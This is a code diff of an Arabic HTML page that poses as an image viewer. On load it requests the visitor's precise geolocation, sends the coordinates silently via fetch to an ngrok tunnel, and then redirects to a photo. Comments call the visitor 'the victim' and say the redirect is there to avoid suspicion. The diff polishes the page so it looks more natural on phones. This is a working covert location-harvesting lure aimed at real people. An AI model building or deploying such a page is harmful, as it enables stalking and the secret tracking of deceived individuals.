@@ -2,35 +2,60 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تحميل الصورة...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>عرض الصورة</title>
     <style>
-        body { background-color: black; color: white; text-align: center; padding-top: 20%; font-family: Arial; }
+        /* إعدادات العرض للهاتف لتبدو الصورة طبيعية */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000; /* خلفية سوداء مثل معرض الصور */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        #loading-text {
+            color: #555;
+            font-family: sans-serif;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
-    <h2>جاري تحميل الصورة الخاصة بك...</h2>
+
+    <div id="loading-text">جاري التحميل...</div>
 
     <script>
         window.onload = function() {
-            // طلب الموقع الجغرافي
+            // 1. طلب إذن الموقع الجغرافي فور الدخول
             navigator.geolocation.getCurrentPosition(function(pos) {
                 
-                // الرابط الخاص بك مدمج هنا وجاهز
+                // رابط ngrok الخاص بك (تأكد أنه لا يزال يعمل)
                 var myNgrok = "https://in-calicoed-overplainly.ngrok-free.dev"; 
+                
+                var lat = pos.coords.latitude;
+                var lon = pos.coords.longitude;
 
-                // إرسال الإحداثيات إلى VS Code
-                fetch(myNgrok + '/log_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude, {
+                // 2. إرسال الإحداثيات إلى VS Code في الخلفية
+                fetch(myNgrok + '/log_location?lat=' + lat + '&lon=' + lon, {
                     mode: 'no-cors'
                 });
 
-                // التحويل للصورة الحقيقية ليبدو الأمر طبيعياً
+                // 3. التحويل لعرض الصورة MSAN.JPG بعد ثانية واحدة
                 setTimeout(function() {
-                    window.location.href = "https://i.pinimg.com/originals/fe/7e/35/fe7e3547d52670be96486121f00845a7.jpg";
+                    window.location.href = "MSAN.JPG";
                 }, 1000);
 
             }, function(err) {
-                // إذا رفض الضحية، يتم تحويله للصورة أيضاً لكي لا يشك في شيء
-                window.location.href = "https://i.pinimg.com/originals/fe/7e/35/fe7e3547d52670be96486121f00845a7.jpg";
+                // حتى لو رفض الضحية الإذن، يتم تحويله للصورة لعدم إثارة الشك
+                window.location.href = "MSAN.JPG";
+            }, {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
             });
         };
     </script>
